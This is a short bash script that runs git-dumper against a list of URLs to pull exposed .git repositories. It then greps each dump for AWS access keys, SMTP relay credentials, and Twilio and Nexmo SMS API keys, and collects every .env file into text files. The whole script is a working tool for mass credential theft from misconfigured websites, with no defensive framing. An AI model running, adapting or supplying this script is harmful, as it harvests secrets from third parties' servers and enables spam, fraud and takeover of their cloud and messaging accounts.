#!/bin/bash
#export PATH=$HOME/.local/bin:$PATH
mkdir -p "envz"
for i in $(cat $1); do
	name=$(echo -n "$i" | cut -d '/' -f3)
	git-dumper -j 50 -t 5 $i $name #git-dumper -h pour savoir comment config proxy, nombre de threads etc
	grep --exclude='*.html' -C25 -rPn 'AKIA[A-Z0-9]{16}' --binary-files=text $name/ | cut -c -500 >> akia.txt
	grep -rniP -C25 "smtp\.sendgrid\.net|smtp\.mailgun\.org|smtp-relay\.sendinblue\.com|email-smtp\.(us|eu|ap|ca|cn|sa)-(central|(north|south)?(west|east)?)-[0-9]{1}\.amazonaws.com|smtp.tipimail.com|smtp.sparkpostmail.com|smtp.deliverabilitymanager.net|smtp.mailendo.com|mail.smtpeter.com|mail.smtp2go.com|smtp.socketlabs.com|secure.emailsrvr.com|smtp.pepipost.com|smtp.elasticemail.com|pro.turbo-smtp.com|smtp-pulse.com|in-v3.mailjet.com" --binary-files=text $name | cut -c -500 >> smtp.txt
	grep -rniP -C25 "(?i)twilio(.{0,20})?SK[0-9a-f]{32}|nexmo_key|nexmo_secret|nexmo_api" --binary-files=text $name | cut -c -500 >> api_sms.txt
	grep -rnP -C25 "AC[a-z0-9]{32}" --binary-files=text $name | cut -c -500 >> TWILIO.txt
	for envi in $(find $name -name ".env*" -type f); do
            cat $envi | tee -a envz/${name}_env.txt
        done
	echo "$i" >> history.txt
	rm -rf $name
done
